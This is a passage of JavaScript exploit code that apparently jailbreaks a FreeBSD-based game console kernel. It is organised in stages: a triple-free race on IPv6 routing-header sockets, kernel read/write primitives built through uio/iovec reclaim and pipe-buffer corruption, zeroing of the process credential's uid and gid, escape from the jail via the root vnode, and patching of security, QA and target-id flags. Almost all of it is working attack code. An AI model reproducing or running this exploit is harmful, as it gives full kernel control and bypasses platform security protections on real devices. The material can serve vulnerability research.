            if (S.free_fd_idx >= S.free_fds.length)
                fail("free_one_fd: free_fds pool exhausted (idx=" +
                    S.free_fd_idx + "/" + S.free_fds.length + ")");
            syscall(SYSCALL.close, BigInt(S.free_fds[S.free_fd_idx]));
            S.free_fd_idx++;
        }

        function flush_iov_workers(S, count) {
            for (let i = 0; i < count; i++) {
                S.iov_ws.signal();
                syscall(SYSCALL.write, BigInt(S.iov_sock_b), S.scratch_big, 1n);
                S.iov_ws.wait();
                syscall(SYSCALL.read, BigInt(S.iov_sock_a), S.dummy_byte, 1n);
            }
        }

        async function attempt_race(S) {

            for (let i = 0; i < S.ipv6_count; i++) rthdr_free_idx(S, i);
            free_one_fd(S);
            flush_iov_workers(S, 32);
            free_one_fd(S);

            const twins = await find_twins(S, MAX_ROUNDS_TWIN);
            if (!twins) return false;

            rthdr_free_idx(S, twins[1]);
            sched_yield_n(2);

            const verify_buf = malloc(UCRED_SIZE);
            const verify_len = malloc(4);
            let reclaimed = false;

            for (let k = 0; k < MAX_ROUNDS_TRIPLET; k++) {
                S.iov_ws.signal();
                sched_yield_n(4);
                write32(verify_len, 8n);
                syscall(SYSCALL.getsockopt, BigInt(S.ipv6_sockets[twins[0]]),
                    IPPROTO_IPV6, IPV6_RTHDR, verify_buf, verify_len);
                if (read32(verify_buf) === 1n) {
                    reclaimed = true;
                    break;
                }
                syscall(SYSCALL.write, BigInt(S.iov_sock_b), S.scratch_big, 1n);
                S.iov_ws.wait();
                syscall(SYSCALL.read, BigInt(S.iov_sock_a), S.dummy_byte, 1n);
            }
            if (!reclaimed) return false;

            S.triplets[0] = twins[0];
            free_one_fd(S);
            syscall(SYSCALL.sched_yield);

            S.triplets[1] = find_triplet(S, S.triplets[0], -1, MAX_ROUNDS_TRIPLET);
            if (S.triplets[1] === -1) return false;

            syscall(SYSCALL.write, BigInt(S.iov_sock_b), S.scratch_big, 1n);
            S.triplets[2] = find_triplet(S, S.triplets[0], S.triplets[1], MAX_ROUNDS_TRIPLET);
            S.iov_ws.wait();
            syscall(SYSCALL.read, BigInt(S.iov_sock_a), S.dummy_byte, 1n);
            if (S.triplets[2] === -1) return false;

            return true;
        }

        async function stage0(S) {
            send_notification("Stage 0\nTriple-free race");

            if (failcheck_path) {
                try { write_file(failcheck_path, ""); } catch (_) { }
            }
            for (let attempt = 1; attempt <= TRIPLEFREE_ATTEMPTS; attempt++) {
                if (await attempt_race(S)) {
                    await ulog("stage0: triplets " + S.triplets.join(",") +
                        " (attempt " + attempt + "/" + TRIPLEFREE_ATTEMPTS +
                        ")");
                    nanosleep_ms(500);
                    return;
                }
                nanosleep_ms(10);
            }
            fail("stage0: race failed after " + TRIPLEFREE_ATTEMPTS + " attempts");
        }

        function build_uio(buf, iov_ptr, td, is_read, kaddr, size) {
            write64(buf, iov_ptr);
            write64(buf + 8n, UIO_IOV_COUNT);
            write64(buf + 16n, 0xFFFFFFFFFFFFFFFFn);
            write64(buf + 24n, size);
            write32(buf + 32n, UIO_SYSSPACE);
            write32(buf + 36n, is_read ? 1n : 0n);
            write64(buf + 40n, td);
            write64(buf + 48n, kaddr);
            write64(buf + 56n, size);
        }

        function signal_uio(S, mode) {
            S.active_uio_mode = mode;
            (mode === 0 ? S.uio_read_ws : S.uio_write_ws).signal();
        }
        function wait_uio(S) {
            (S.active_uio_mode === 0 ? S.uio_read_ws : S.uio_write_ws).wait();
        }

        function kread_slow(S, kaddr, size) {
            if (!triplets_valid(S)) return null;
            for (let i = 0; i < 64; i += 8) write64(S.uio_read_buf + BigInt(i), 0x4141414141414141n);
            for (let i = 0; i < UIO_THREAD_NUM; i++) {
                for (let j = 0; j < size; j++) write8(S.kread_result_bufs[i] + BigInt(j), 0n);
            }
            write32(S.kread_sndbuf, BigInt(size));
            syscall(SYSCALL.setsockopt, BigInt(S.uio_sock_b), SOL_SOCKET, SO_SNDBUF,
                S.kread_sndbuf, 4n);
            syscall(SYSCALL.write, BigInt(S.uio_sock_b), S.scratch_big, BigInt(size));
            write64(S.uio_iov_read + 8n, BigInt(size));

            if (!triplets_valid(S)) return null;
            rthdr_free_idx(S, S.triplets[1]);
            sched_yield_n(3);

            let leaked_iov = 0n;
            let found = false;
            for (let it = 0; it < 2000; it++) {
                signal_uio(S, 0);
                syscall(SYSCALL.sched_yield);
                write32(S.len_out, 16n);
                syscall(SYSCALL.getsockopt, BigInt(S.ipv6_sockets[S.triplets[0]]),
                    IPPROTO_IPV6, IPV6_RTHDR, S.rthdr_readback, S.len_out);
                if (read32(S.rthdr_readback + 8n) === UIO_IOV_COUNT) { found = true; break; }
                syscall(SYSCALL.read, BigInt(S.uio_sock_a), S.scratch_big, BigInt(size));
                for (let i = 0; i < UIO_THREAD_NUM; i++) {
                    syscall(SYSCALL.read, BigInt(S.uio_sock_a),
                        S.kread_result_bufs[i], BigInt(size));
                }
                wait_uio(S);
                syscall(SYSCALL.write, BigInt(S.uio_sock_b), S.scratch_big, BigInt(size));
            }
            if (!found) return null;
            leaked_iov = read64(S.rthdr_readback);
            if (leaked_iov === 0n || (leaked_iov >> 48n) !== 0xFFFFn) return null;

            build_uio(S.recvmsg_iovecs, leaked_iov, 0n, true, kaddr, BigInt(size));

            if (!triplets_valid(S)) return null;
            rthdr_free_idx(S, S.triplets[2]);
            sched_yield_n(3);

            found = false;
            for (let it = 0; it < 2000; it++) {
                S.iov_ws.signal();
                sched_yield_n(5);
                write32(S.len_out, 64n);
                syscall(SYSCALL.getsockopt, BigInt(S.ipv6_sockets[S.triplets[0]]),
                    IPPROTO_IPV6, IPV6_RTHDR, S.rthdr_readback, S.len_out);
                if (read32(S.rthdr_readback + 32n) === UIO_SYSSPACE) { found = true; break; }
                syscall(SYSCALL.write, BigInt(S.iov_sock_b), S.scratch_big, 1n);
                S.iov_ws.wait();
                syscall(SYSCALL.read, BigInt(S.iov_sock_a), S.dummy_byte, 1n);
            }
            if (!found) return null;

            syscall(SYSCALL.read, BigInt(S.uio_sock_a), S.scratch_big, BigInt(size));
            let result = null;
            for (let i = 0; i < UIO_THREAD_NUM; i++) {
                syscall(SYSCALL.read, BigInt(S.uio_sock_a), S.kread_result_bufs[i], BigInt(size));
                const v = read64(S.kread_result_bufs[i]);
                if (v !== 0x4141414141414141n) {
                    const t = find_triplet(S, S.triplets[0], -1, FIND_TRIPLET_FAST);
                    if (t === -1) {
                        wait_uio(S);
                        syscall(SYSCALL.write, BigInt(S.iov_sock_b), S.scratch_big, 1n);
                        S.iov_ws.wait();
                        syscall(SYSCALL.read, BigInt(S.iov_sock_a), S.dummy_byte, 1n);
                        S.triplets[1] = find_triplet(S, S.triplets[0], S.triplets[2], FIND_TRIPLET_FAST);
                        return null;
                    }
                    S.triplets[1] = t;
                    result = S.kread_result_bufs[i];
                }
            }
            wait_uio(S);
            syscall(SYSCALL.write, BigInt(S.iov_sock_b), S.scratch_big, 1n);
            if (result === null) {
                S.iov_ws.wait();
                syscall(SYSCALL.read, BigInt(S.iov_sock_a), S.dummy_byte, 1n);
                return null;
            }

            for (let k = 0; k < 5; k++) {
                S.triplets[2] = find_triplet(S, S.triplets[0], S.triplets[1], FIND_TRIPLET_FAST);
                if (S.triplets[2] !== -1) break;
                syscall(SYSCALL.sched_yield);
            }
            if (S.triplets[2] === -1) {
                S.iov_ws.wait();
                syscall(SYSCALL.read, BigInt(S.iov_sock_a), S.dummy_byte, 1n);
                return null;
            }
            S.iov_ws.wait();
            syscall(SYSCALL.read, BigInt(S.iov_sock_a), S.dummy_byte, 1n);
            return result;
        }

        function kwrite_slow(S, kaddr, data_addr, data_size) {
            if (!triplets_valid(S)) return false;
            write32(S.kwrite_sndbuf, BigInt(data_size));
            syscall(SYSCALL.setsockopt, BigInt(S.uio_sock_b), SOL_SOCKET, SO_SNDBUF,
                S.kwrite_sndbuf, 4n);
            write64(S.uio_iov_write + 8n, BigInt(data_size));

            if (!triplets_valid(S)) return false;
            rthdr_free_idx(S, S.triplets[1]);
            sched_yield_n(3);

            let leaked_iov = 0n; let found = false;
            for (let it = 0; it < 2000; it++) {
                signal_uio(S, 1);
                syscall(SYSCALL.sched_yield);
                write32(S.len_out, 16n);
                syscall(SYSCALL.getsockopt, BigInt(S.ipv6_sockets[S.triplets[0]]),
                    IPPROTO_IPV6, IPV6_RTHDR, S.rthdr_readback, S.len_out);
                if (read32(S.rthdr_readback + 8n) === UIO_IOV_COUNT) { found = true; break; }
                for (let i = 0; i < UIO_THREAD_NUM; i++) {
                    syscall(SYSCALL.write, BigInt(S.uio_sock_b), data_addr, BigInt(data_size));
                }
                wait_uio(S);
            }
            if (!found) return false;
            leaked_iov = read64(S.rthdr_readback);
            if (leaked_iov === 0n || (leaked_iov >> 48n) !== 0xFFFFn) return false;

            build_uio(S.recvmsg_iovecs, leaked_iov, 0n, false, kaddr, BigInt(data_size));
            if (!triplets_valid(S)) return false;
            rthdr_free_idx(S, S.triplets[2]);
            sched_yield_n(3);

            found = false;
            for (let it = 0; it < 2000; it++) {
                S.iov_ws.signal();
                sched_yield_n(5);
                write32(S.len_out, 64n);
                syscall(SYSCALL.getsockopt, BigInt(S.ipv6_sockets[S.triplets[0]]),
                    IPPROTO_IPV6, IPV6_RTHDR, S.rthdr_readback, S.len_out);
                if (read32(S.rthdr_readback + 32n) === UIO_SYSSPACE) { found = true; break; }
                syscall(SYSCALL.write, BigInt(S.iov_sock_b), S.scratch_big, 1n);
                S.iov_ws.wait();
                syscall(SYSCALL.read, BigInt(S.iov_sock_a), S.dummy_byte, 1n);
            }
            if (!found) return false;

            for (let i = 0; i < UIO_THREAD_NUM; i++) {
                syscall(SYSCALL.write, BigInt(S.uio_sock_b), data_addr, BigInt(data_size));
            }

            for (let k = 0; k < 5; k++) {
                S.triplets[1] = find_triplet(S, S.triplets[0], -1, FIND_TRIPLET_FAST);
                if (S.triplets[1] !== -1) break;
                syscall(SYSCALL.sched_yield);
            }
            if (S.triplets[1] === -1) return false;

            wait_uio(S);
            syscall(SYSCALL.write, BigInt(S.iov_sock_b), S.scratch_big, 1n);

            for (let k = 0; k < 5; k++) {
                S.triplets[2] = find_triplet(S, S.triplets[0], S.triplets[1], FIND_TRIPLET_FAST);
                if (S.triplets[2] !== -1) break;
                syscall(SYSCALL.sched_yield);
            }
            if (S.triplets[2] === -1) return false;

            S.iov_ws.wait();
            syscall(SYSCALL.read, BigInt(S.iov_sock_a), S.dummy_byte, 1n);
            return true;
        }

        function kslow64(S, kaddr) {
            for (let attempt = 0; attempt < 3; attempt++) {
                if (triplets_valid(S)) {
                    const buf = kread_slow(S, kaddr, 8);
                    if (buf !== null) {
                        const val = read64(buf);
                        if (val !== 0n) {
                            if ((val >> 48n) === 0xFFFFn) return val;
                            if ((val >> 40n) !== 0n) return val;
                        }
                    }
                }
                repair_triplets(S); syscall(SYSCALL.sched_yield);
            }
            return null;
        }

        async function stage1(S) {
            send_notification("Stage 1\nKqueue reclaim");
            rthdr_free_idx(S, S.triplets[1]);
            sched_yield_n(2);
            let kq_batch = []; let kq_found = false; let proc_filedesc = 0n;
            for (let k = 0; k < 5000; k++) {
                const kq = syscall(SYSCALL.kqueue);
                if (kq === 0xffffffffffffffffn) {
                    for (const fd of kq_batch) syscall(SYSCALL.close, fd);
                    kq_batch = []; syscall(SYSCALL.sched_yield); continue;
                }
                kq_batch.push(kq);
                write32(S.len_out, 256n);
                syscall(SYSCALL.getsockopt, BigInt(S.ipv6_sockets[S.triplets[0]]),
                    IPPROTO_IPV6, IPV6_RTHDR, S.rthdr_readback, S.len_out);
                if (read32(S.rthdr_readback + 8n) === 0x1430000n &&
                    read64(S.rthdr_readback + S.OFF.KQ_FDP) !== 0n) {
                    kq_found = true;
                    for (const fd of kq_batch) if (fd !== kq) syscall(SYSCALL.close, fd);
                    proc_filedesc = read64(S.rthdr_readback + S.OFF.KQ_FDP);
                    syscall(SYSCALL.close, kq);
                    break;
                }
                if (kq_batch.length >= 8) {
                    for (const fd of kq_batch) syscall(SYSCALL.close, fd);
                    kq_batch = []; syscall(SYSCALL.sched_yield);
                }
            }
            if (!kq_found) {
                for (const fd of kq_batch) syscall(SYSCALL.close, fd);
                fail("stage1: kqueue reclaim failed");
            }
            if ((proc_filedesc >> 48n) !== 0xFFFFn) fail("stage1: bad filedesc: " + toHex(proc_filedesc));
            S.proc_filedesc = proc_filedesc;
            await ulog("stage1: proc_filedesc=" + toHex(proc_filedesc));

            for (let k = 0; k < 3; k++) {
                S.triplets[1] = find_triplet(S, S.triplets[0], S.triplets[2], 50000);
                if (S.triplets[1] !== -1) break;
                syscall(SYSCALL.sched_yield); nanosleep_ms(10);
            }
            if (S.triplets[1] === -1) fail("stage1: triplet repair failed");
        }

        async function stage2(S) {
            send_notification("Stage 2\nLeak pipe data pointers");
            await ulog("stage2: leaking pipe pointers...");
            for (let attempt = 0; attempt < 5; attempt++) {
                repair_triplets(S); nanosleep_ms(100);
                const fdescenttbl = kslow64(S, S.proc_filedesc + S.OFF.FILEDESC_OFILES);
                if (!fdescenttbl) continue;
                S.fd_ofiles = fdescenttbl + S.OFF.FDESCENTTBL_HDR;
                repair_triplets(S); nanosleep_ms(500); repair_triplets(S);

                const master_fp = kslow64(S, S.fd_ofiles + BigInt(S.master_rfd) * S.OFF.FILEDESCENT_SIZE);
                if (!master_fp) continue;
                repair_triplets(S); nanosleep_ms(500); repair_triplets(S);

                const victim_fp = kslow64(S, S.fd_ofiles + BigInt(S.victim_rfd) * S.OFF.FILEDESCENT_SIZE);
                if (!victim_fp) continue;
                repair_triplets(S); nanosleep_ms(500); repair_triplets(S);

                S.master_pipe_data = kslow64(S, master_fp);
                if (!S.master_pipe_data) continue;
                repair_triplets(S); nanosleep_ms(500); repair_triplets(S);

                S.victim_pipe_data = kslow64(S, victim_fp);
                if (!S.victim_pipe_data) continue;

                if (S.master_pipe_data !== S.victim_pipe_data) {
                    await ulog("stage2: master_pipe=" + toHex(S.master_pipe_data) +
                        " victim_pipe=" + toHex(S.victim_pipe_data));
                    return;
                }
                nanosleep_ms(500); repair_triplets(S);
            }
            fail("stage2: failed to leak pipe pointers");
        }

        async function stage3(S) {
            send_notification("Stage 3\nPipe corruption -> fast kernel R/W");
            await ulog("stage3: corrupting pipe buffer...");

            const pipe_overwrite = malloc(24);
            write32(pipe_overwrite, 0n);
            write32(pipe_overwrite + 4n, 0n);
            write32(pipe_overwrite + 8n, 0n);
            write32(pipe_overwrite + 12n, BigInt(PAGE_SIZE));
            write64(pipe_overwrite + 16n, S.victim_pipe_data);

            nanosleep_ms(100);

            let ok = false;
            for (let attempt = 0; attempt < 40; attempt++) {
                repair_triplets(S);
                if (kwrite_slow(S, S.master_pipe_data, pipe_overwrite, 24)) { ok = true; break; }
                nanosleep_ms(100); syscall(SYSCALL.sched_yield);
            }
            if (!ok) fail("stage3: kwrite_slow failed after 40 attempts");
            syscall(SYSCALL.sched_yield);

            const pipe_cmd = malloc(24);
            const set_victim_pipe = (cnt, inp, out, size, buf_addr) => {
                write32(pipe_cmd, BigInt(cnt));
                write32(pipe_cmd + 4n, BigInt(inp));
                write32(pipe_cmd + 8n, BigInt(out));
                write32(pipe_cmd + 12n, BigInt(size));
                write64(pipe_cmd + 16n, buf_addr);
                syscall(SYSCALL.write, BigInt(S.master_wfd), pipe_cmd, 24n);
                syscall(SYSCALL.read, BigInt(S.master_rfd), pipe_cmd, 24n);
            };

            S.kread = (buf_addr, kaddr, size) => {
                set_victim_pipe(size, 0, 0, PAGE_SIZE, kaddr);
                return syscall(SYSCALL.read, BigInt(S.victim_rfd), buf_addr, BigInt(size));
            };
            S.kwrite = (kaddr, buf_addr, size) => {
                set_victim_pipe(0, 0, 0, PAGE_SIZE, kaddr);
                return syscall(SYSCALL.write, BigInt(S.victim_wfd), buf_addr, BigInt(size));
            };
            S.kread32 = (k) => { S.kread(S.scratch_big, k, 4); return read32(S.scratch_big); };
            S.kread64 = (k) => { S.kread(S.scratch_big, k, 8); return read64(S.scratch_big); };
            S.kwrite32 = (k, v) => { write32(S.scratch_big, BigInt(v)); S.kwrite(k, S.scratch_big, 4); };
            S.kwrite64 = (k, v) => { write64(S.scratch_big, BigInt(v)); S.kwrite(k, S.scratch_big, 8); };

            let verified = false;
            for (let attempt = 0; attempt < 3; attempt++) {
                if (S.kread64(S.master_pipe_data + 0x10n) === S.victim_pipe_data) {
                    verified = true; break;
                }
                nanosleep_ms(100); repair_triplets(S);
                kwrite_slow(S, S.master_pipe_data, pipe_overwrite, 24);
            }
            if (!verified) fail("stage3: verify failed");
            await ulog("stage3: kernel r/w achieved");

            await stage3_cleanup(S);
        }

        async function stage3_cleanup(S) {
            const get_fp = fd => S.kread64(S.fd_ofiles + BigInt(fd) * S.OFF.FILEDESCENT_SIZE);
            const bump = (fp, delta) => {
                const rc = S.kread32(fp + 0x28n);
                if (rc > 0n && rc < 0x10000n) S.kwrite32(fp + 0x28n, Number(rc) + delta);
            };
            const null_rthdr = fd => {
                const fp = S.kread64(S.fd_ofiles + BigInt(fd) * S.OFF.FILEDESCENT_SIZE);
                if (fp === 0n || (fp >> 48n) !== 0xFFFFn) return;
                const f_data = S.kread64(fp);
                if (f_data === 0n || (f_data >> 48n) !== 0xFFFFn) return;
                const so_pcb = S.kread64(f_data + 0x18n);
                if (so_pcb === 0n || (so_pcb >> 48n) !== 0xFFFFn) return;
                const pktopts = S.kread64(so_pcb + S.OFF.INPCB_PKTOPTS);
                if (pktopts === 0n || (pktopts >> 48n) !== 0xFFFFn) return;
                S.kwrite64(pktopts + S.OFF.IP6PO_RTHDR, 0n);
            };

            for (const fd of [S.master_rfd, S.master_wfd, S.victim_rfd, S.victim_wfd]) {
                const fp = get_fp(fd);
                if (fp === 0n || (fp >> 48n) !== 0xFFFFn) fail("stage3b: bad fp " + fd);
                bump(fp, 0x100);
            }
            for (const fd of S.ipv6_sockets) null_rthdr(fd);

            for (let i = S.free_fd_idx; i < S.free_fds.length; i++) {
                syscall(SYSCALL.close, BigInt(S.free_fds[i]));
            }
            for (const fd of S.ipv6_sockets) syscall(SYSCALL.close, BigInt(fd));
            syscall(SYSCALL.close, BigInt(S.iov_sock_a));
            syscall(SYSCALL.close, BigInt(S.iov_sock_b));
            syscall(SYSCALL.close, BigInt(S.uio_sock_a));
            syscall(SYSCALL.close, BigInt(S.uio_sock_b));

            S.iov_ws.signal();
            S.uio_read_ws.signal();
            S.uio_write_ws.signal();
            syscall(SYSCALL.sched_yield);
            syscall(SYSCALL.sched_yield);

            for (let i = 0; i < 16; i++) write8(S.cpu_mask + BigInt(i), 0xffn);
            syscall(SYSCALL.cpuset_setaffinity, 3n, 1n, 0xFFFFFFFFFFFFFFFFn, 0x10n, S.cpu_mask);
            write16(S.rt_params, 0n);
            write16(S.rt_params + 2n, 0n);
            syscall(SYSCALL.rtprio_thread, RTP_SET, 0n, S.rt_params);

            await ulog("stage3b: race cleanup done");

            await js_sleep(3000);
        }

        async function force_td_ucred_migrate(S) {

            try {
                const B = S.proc_ucred;
                if (B === 0n || (B >> 48n) !== 0xFFFFn) {
                    await ulog("stage_d6: proc_ucred invalid, skip");
                    return;
                }

                const main_thread = S.kread64(S.curproc + 0x10n);
                if (main_thread === 0n || (main_thread >> 48n) !== 0xFFFFn) {
                    await ulog("stage_d6: p_threads empty, skip");
                    return;
                }

                const bp = S.kread64(main_thread + 0x08n);
                if (bp !== S.curproc) {
                    await ulog("stage_d6: td_proc backptr mismatch (" + toHex(bp) +
                        " vs " + toHex(S.curproc) + "), skip");
                    return;
                }

                const next_thread = S.kread64(main_thread + 0x10n);
                if (next_thread === 0n || (next_thread >> 48n) !== 0xFFFFn ||
                    next_thread === main_thread) {
                    await ulog("stage_d6: no 2nd thread for cross-validation, skip");
                    return;
                }
                const candidates = [];
                for (let off = 0x100n; off <= 0x200n; off += 8n) {
                    const v_main = S.kread64(main_thread + off);
                    if (v_main !== B) continue;
                    const v_next = S.kread64(next_thread + off);
                    if (v_next === 0n || (v_next >> 48n) !== 0xFFFFn) continue;
                    if (v_next === B) continue;
                    candidates.push(off);
                }
                if (candidates.length === 0) {
                    await ulog("stage_d6: td_ucred offset not found, skip");
                    return;
                }
                if (candidates.length > 1) {
                    await ulog("stage_d6: td_ucred offset ambiguous (" +
                        candidates.length + " candidates), skip");
                    return;
                }
                const td_ucred_off = candidates[0];
                await ulog("stage_d6: td_ucred at +" + toHex(td_ucred_off) +
                    " (1 cand, validated)");

                let td = main_thread;
                let patched = 0;
                let walked = 0;
                while (td !== 0n && (td >> 48n) === 0xFFFFn && walked < 500) {
                    walked++;

                    if (S.kread64(td + 0x08n) !== S.curproc) {
                        await ulog("stage_d6: td_proc mismatch at thread " +
                            toHex(td) + ", abort walk");
                        break;
                    }
                    const cur = S.kread64(td + td_ucred_off);
                    if (cur !== B) {
                        S.kwrite64(td + td_ucred_off, B);
                        patched++;
                    }
                    td = S.kread64(td + 0x10n);
                }
                await ulog("stage_d6: walked " + walked + " threads, patched " +
                    patched + " stale td_ucred");

                if (patched > 0) {

                    const old_ref = S.kread32(B);
                    const new_ref = old_ref + BigInt(patched);
                    S.kwrite32(B, new_ref);
                    await ulog("stage_d6: cr_ref(B) " + toHex(old_ref) +
                        " -> " + toHex(new_ref) + " (+" + patched + ")");
                }
            } catch (e) {
                try { await ulog("stage_d6: exception: " + e.message + " - skipped"); }
                catch (_) { }
            }
        }

        async function stage4(S) {
            send_notification("Stage 4\nFind curproc + rootvnode");

            const [sr, sw] = create_pipe();
            const sigio_rfd = Number(sr), sigio_wfd = Number(sw);
            const our_pid = syscall(SYSCALL.getpid) & 0xFFFFFFFFn;
            const pid_buf = malloc(4);
            write32(pid_buf, our_pid);
            syscall(SYSCALL.ioctl, BigInt(sigio_rfd), 0x8004667Cn, pid_buf);

            const sigio_fp = S.kread64(S.fd_ofiles + BigInt(sigio_rfd) * S.OFF.FILEDESCENT_SIZE);
            if (sigio_fp === 0n || (sigio_fp >> 48n) !== 0xFFFFn) fail("stage4: bad sigio fp");
            const sigio_pipe = S.kread64(sigio_fp);
            if (sigio_pipe === 0n || (sigio_pipe >> 48n) !== 0xFFFFn) fail("stage4: bad sigio pipe");
            const pipe_sigio = S.kread64(sigio_pipe + S.OFF.PIPE_SIGIO);
            if (pipe_sigio === 0n || (pipe_sigio >> 48n) !== 0xFFFFn) fail("stage4: no sigio");
            const curproc = S.kread64(pipe_sigio);
            if (curproc === 0n || (curproc >> 48n) !== 0xFFFFn) fail("stage4: bad curproc");
            if (S.kread32(curproc + S.OFF.PROC_PID) !== our_pid) fail("stage4: pid mismatch");

            syscall(SYSCALL.close, BigInt(sigio_rfd));
            syscall(SYSCALL.close, BigInt(sigio_wfd));

            S.curproc = curproc;
            S.proc_ucred = S.kread64(curproc + S.OFF.PROC_UCRED);
            S.proc_fd = S.kread64(curproc + S.OFF.PROC_FD);
            await ulog("stage4: curproc=" + toHex(curproc) + " fd=" + toHex(S.proc_fd));

            await force_td_ucred_migrate(S);

            const walk = (start, link_off) => {
                let p = start;
                for (let i = 0; i < 500; i++) {
                    if (p === 0n || (p >> 48n) !== 0xFFFFn) return null;
                    if (S.kread32(p + S.OFF.PROC_PID) === 1n) return p;
                    p = S.kread64(p + link_off);
                }
                return null;
            };
            let init_proc = walk(curproc, 0n) || walk(S.kread64(curproc + 8n), 8n);
            let rootvnode = null;
            if (init_proc) {
                const init_fd = S.kread64(init_proc + S.OFF.PROC_FD);
                if (init_fd !== 0n && (init_fd >> 48n) === 0xFFFFn) {
                    rootvnode = S.kread64(init_fd + S.OFF.FD_RDIR);
                }
            }
            if (!rootvnode || rootvnode === 0n || (rootvnode >> 48n) !== 0xFFFFn) {
                fail("stage4: rootvnode not found");
            }
            S.rootvnode = rootvnode;
            await ulog("stage4: rootvnode=" + toHex(rootvnode));
        }

        async function stage5(S) {
            send_notification("Stage 5\nJailbreak");

            S.kwrite32(S.proc_ucred + S.OFF.UCRED_CR_UID, 0);
            S.kwrite32(S.proc_ucred + S.OFF.UCRED_CR_RUID, 0);
            S.kwrite32(S.proc_ucred + S.OFF.UCRED_CR_SVUID, 0);
            S.kwrite32(S.proc_ucred + S.OFF.UCRED_CR_NGROUPS, 1);
            S.kwrite32(S.proc_ucred + S.OFF.UCRED_CR_RGID, 0);

            let attrs = S.kread64(S.proc_ucred + 0x80n);
            attrs = (attrs & 0xFFFFFFFF00FFFFFFn) | (0x80n << 24n);
            S.kwrite64(S.proc_ucred + 0x80n, attrs);

            S.kwrite64(S.proc_fd + S.OFF.FD_RDIR, S.rootvnode);
            S.kwrite64(S.proc_fd + S.OFF.FD_JDIR, S.rootvnode);

            if (S.kread32(S.proc_ucred + S.OFF.UCRED_CR_UID) !== 0n) {
                fail("stage5: jailbreak verify failed");
            }
            await ulog("stage5: jailbreak ok");
        }

        async function stage6(S) {
            send_notification("Stage 6\nData_base + Debug menu");

            const KDATA_MASK = 0xffff804000000000n;
            let p = S.curproc, allproc = 0n;
            for (let i = 0; i < 64; i++) {
                if (p !== 0n && (p & KDATA_MASK) === KDATA_MASK &&
                    ((p - S.OFF.DATA_BASE_ALLPROC) & 0xfffn) === 0n) {
                    allproc = p; break;
                }
                p = S.kread64(p + 8n);
            }
            if (allproc === 0n) {
                S.data_base_ok = false;
                await ulog("stage6: allproc not found - debug menu + elf " +
                    "loader skipped (jailbreak is done)");
                return;
            }
            const data_base = allproc - S.OFF.DATA_BASE_ALLPROC;
            S.data_base = data_base;
            await ulog("stage6: allproc=" + toHex(allproc) +
                " data_base=" + toHex(data_base));

            let data_base_ok = true;
            const first_proc = S.kread64(allproc);
            const first_proc_ok = (first_proc >> 48n) === 0xFFFFn;
            await ulog("stage6: data_base check - *allproc=" + toHex(first_proc) +
                (first_proc_ok ? "  (kptr OK)" : "  (BAD - not a kptr)"));
            if (!first_proc_ok) data_base_ok = false;
            if (S.OFF.DATA_BASE_ROOTVNODE) {
                const rv_off = S.kread64(data_base + S.OFF.DATA_BASE_ROOTVNODE);
                const rv_ok = (rv_off === S.rootvnode);
                await ulog("stage6: data_base check - rootvnode via offset=" +
                    toHex(rv_off) + " vs stage4 found=" + toHex(S.rootvnode) +
                    (rv_ok ? "  => data_base CORRECT"
                        : "  => MISMATCH - data_base / 11.60 offsets are WRONG"));
                if (!rv_ok) data_base_ok = false;
            }

            if (typeof is_jailbroken === "function")
                await ulog("stage6: is_jailbroken() = " + is_jailbroken());
            S.data_base_ok = data_base_ok;
            if (!data_base_ok) {
                await ulog("stage6: data_base check FAILED - skipping the debug " +
                    "menu and the elf loader. The jailbreak is complete.");
                return;
            }

            if (ENABLE_DEBUG_MENU) {
                await stage_debug_menu(S);
            } else {
                await ulog("stage6: debug menu DISABLED (ENABLE_DEBUG_MENU=false)");
            }
        }

        async function stage_debug_menu(S) {
            try {
                if (typeof gpu === "undefined" || typeof kernel === "undefined" ||
                    typeof update_kernel_offsets !== "function") {
                    await ulog("stage_debug: framework gpu/kernel/update_kernel_offsets " +
                        "not in scope - skipped");
                    return;
                }
                if (!S.data_base || !S.curproc) {
                    await ulog("stage_debug: data_base/curproc missing - skipped");
                    return;
                }

                kernel.read_buffer = (kaddr, size) => {
                    S.kread(S.scratch_big, BigInt(kaddr), Number(size));
                    return read_buffer(S.scratch_big, Number(size));
                };
                kernel.write_buffer = (kaddr, buf) => {
                    write_buffer(S.scratch_big, buf);
                    S.kwrite(BigInt(kaddr), S.scratch_big, buf.length);
                };

                kernel.addr.curproc = S.curproc;
                kernel.addr.data_base = S.data_base;
                const pmap_store = S.data_base + S.OFF.DATA_BASE_KERNEL_PMAP_STORE;
                const pml4 = S.kread64(pmap_store + S.OFF.PMAP_PML4);
                const cr3 = S.kread64(pmap_store + S.OFF.PMAP_CR3);
                kernel.addr.kernel_cr3 = cr3;
                kernel.addr.dmap_base = pml4 - cr3;
                await ulog("stage_debug: cr3=" + toHex(cr3) +
                    " dmap_base=" + toHex(kernel.addr.dmap_base));

                if (kernel_offset.SIZEOF_GVMSPACE === undefined) kernel_offset.SIZEOF_GVMSPACE = 0x100n;
                if (kernel_offset.GVMSPACE_START_VA === undefined) kernel_offset.GVMSPACE_START_VA = 0x08n;
                if (kernel_offset.GVMSPACE_SIZE === undefined) kernel_offset.GVMSPACE_SIZE = 0x10n;
                if (kernel_offset.GVMSPACE_PAGE_DIR_VA === undefined) kernel_offset.GVMSPACE_PAGE_DIR_VA = 0x38n;

                update_kernel_offsets();
                await ulog("stage_debug: VMSPACE_VM_PMAP=" +
                    toHex(kernel_offset.VMSPACE_VM_PMAP) + " VM_VMID=" +
                    toHex(kernel_offset.VMSPACE_VM_VMID));

                await gpu.setup();
                await ulog("stage_debug: gpu.setup() ok");

                const security_flags_addr = kernel.addr.data_base + kernel_offset.DATA_BASE_SECURITY_FLAGS;
                const target_id_flags_addr = kernel.addr.data_base + kernel_offset.DATA_BASE_TARGET_ID;
                const qa_flags_addr = kernel.addr.data_base + kernel_offset.DATA_BASE_QA_FLAGS;
                const utoken_flags_addr = kernel.addr.data_base + kernel_offset.DATA_BASE_UTOKEN_FLAGS;

                await ulog("stage_debug: setting security flags");
                const security_flags = await kernel.read_dword(security_flags_addr);
                await ulog("  before: " + toHex(security_flags));
                await gpu.write_dword(security_flags_addr, security_flags | 0x14n);
                const security_flags_after = await kernel.read_dword(security_flags_addr);
                await ulog("  after:  " + toHex(security_flags_after));

                await ulog("stage_debug: setting targetid");
                const target_id_before = await kernel.read_byte(target_id_flags_addr);
                await ulog("  before: " + toHex(target_id_before));
                await gpu.write_byte(target_id_flags_addr, 0x82n);
                const target_id_after = await kernel.read_byte(target_id_flags_addr);
                await ulog("  after:  " + toHex(target_id_after));

                await ulog("stage_debug: setting qa flags and utoken flags");
                const qa_flags = await kernel.read_dword(qa_flags_addr);
